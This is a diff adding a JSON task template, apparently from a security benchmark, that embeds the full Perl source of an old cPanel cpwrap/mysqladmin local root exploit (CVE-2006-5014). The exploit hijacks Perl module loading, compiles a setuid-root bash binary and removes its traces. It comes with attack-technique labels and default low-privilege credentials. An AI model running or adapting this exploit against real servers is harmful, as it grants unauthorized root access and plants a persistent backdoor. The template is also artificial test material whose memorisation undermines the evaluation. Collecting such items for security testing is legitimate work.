@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_2466",
+  "category": "D3_database",
+  "attack_technique": "T1078.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: cPanel 10.8.x - cpwrap via MySQLAdmin Privilege Escalation (OSVDB-29122;CVE-2006-5014)\n\nExploit source code (2466.pl):\n```\n#!/usr/bin/perl -w\n\n# 10/01/06 - cPanel <= 10.8.x cpwrap root exploit via mysqladmin\n# use strict; # haha oh wait..\n\nmy $cpwrap       = \"/usr/local/cpanel/bin/cpwrap\";\nmy $mysqlwrap    = \"/usr/local/cpanel/bin/mysqlwrap\";\nmy $pwd          = `pwd`;\n\nchomp $pwd;\n$ENV{'PERL5LIB'} = \"$pwd\";\n\nif ( ! -x \"/usr/bin/gcc\" )  { die \"gcc: $!\\n\"; }\nif ( ! -x \"$cpwrap\" )       { die \"$cpwrap: $!\\n\"; }\nif ( ! -x \"$mysqlwrap\" )    { die \"$mysqlwrap: $!\\n\"; }\n\nopen  (CPWRAP, \"<$cpwrap\") or die \"Could not open $cpwrap: $!\\n\";\nwhile(<CPWRAP>) {\n   if(/REMOTE_USER/) { die \"$cpwrap is patched.\\n\"; }\n}\nclose (CPWRAP);\n\nopen  (STRICT, \">strict.pm\") or die \"Can't open strict.pm: $!\\n\";\nprint  STRICT  \"\\$e  = \\\"int main(){setreuid(0,0);setregid(0,0);system(\\\\\\\\\\\\\\\"/bin/bash\\\\\\\\\\\\\\\");}\\\";\\n\";\nprint  STRICT  \"system(\\\"/bin/echo -n \\\\\\\"\\$e\\\\\\\">Maildir.c\\\");\\n\";\nprint  STRICT  \"system(\\\"/usr/bin/gcc Maildir.c -o Maildir\\\");\\n\";\nprint  STRICT  \"system(\\\"/bin/chmod 4755 Maildir\\\");\\n\";\nprint  STRICT  \"system(\\\"/bin/rm -f Maildir.c strict.pm\\\");\\n\";\nclose (STRICT);\n\nsystem(\"$mysqlwrap DUMPMYSQL 2>/dev/null\");\n\nif ( -e \"Maildir\" ) {\n   system(\"./Maildir\");\n}\nelse {\n   unlink \"strict.pm\";\n   die \"Failed\\n\";\n}\n\n# milw0rm.com [2006-10-01]\n```",
+  "cve": "OSVDB-29122;CVE-2006-5014",
+  "exploitdb_id": "2466",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_2466",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
